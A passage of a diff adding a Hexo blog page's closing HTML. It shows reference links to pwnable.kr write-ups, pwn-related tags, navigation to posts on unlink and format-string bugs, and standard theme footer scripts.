+target="_blank" rel="noopener" href="http://weaponx.site/2017/02/13/%E4%B8%80%E4%BA%9Bpwn%E9%A2%98%E7%9B%AE%E7%9A%84%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-pwnable-kr/">pwnable.kr</a>
+[4] <a
+target="_blank" rel="noopener" href="http://blog.csdn.net/SmalOSnail/article/details/53149426">PEDA用法总结</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+              <a href="/tags/pwnable-kr/" rel="tag"># pwnable.kr</a>
+              <a href="/tags/got/" rel="tag"># got</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2017/08/14/unlink/" rel="prev" title="unlink">
+                  <i class="fa fa-angle-left"></i> unlink
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2017/08/22/fsb/" rel="next" title="fsb">
+                  fsb <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2023</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Max</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">true</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"none","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
+<script src="/js/third-party/math/mathjax.js"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+
+
+
+</body>
+</html>
